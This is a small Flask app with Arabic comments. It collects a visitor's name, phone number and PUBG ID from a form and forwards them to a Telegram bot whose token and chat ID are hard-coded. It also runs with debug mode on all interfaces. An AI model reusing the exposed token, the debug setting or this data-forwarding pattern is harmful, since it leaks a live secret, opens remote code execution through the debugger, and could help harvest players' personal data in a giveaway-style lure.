from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

# 🔴 ضع بيانات البوت هنا
BOT_TOKEN = "8073621434:AAH-Bm7fVfkl-1VeGZGE_oyBLGr2tSCNnhE"
CHAT_ID = "703015262"


def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": text
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print("Error:", e)


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/send", methods=["POST"])
def send():

    name = request.form.get("name")
    phone = request.form.get("phone")
    pubg_id = request.form.get("pubg_id")

    text = f"""
🎮 PUBG FORM

👤 الاسم: {name}
📱 الهاتف: {phone}
🆔 PUBG ID: {pubg_id}
"""

    send_to_telegram(text)

    return "<h2 style='text-align:center;font-family:Arial;'>تم الإرسال بنجاح ✅</h2>"


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)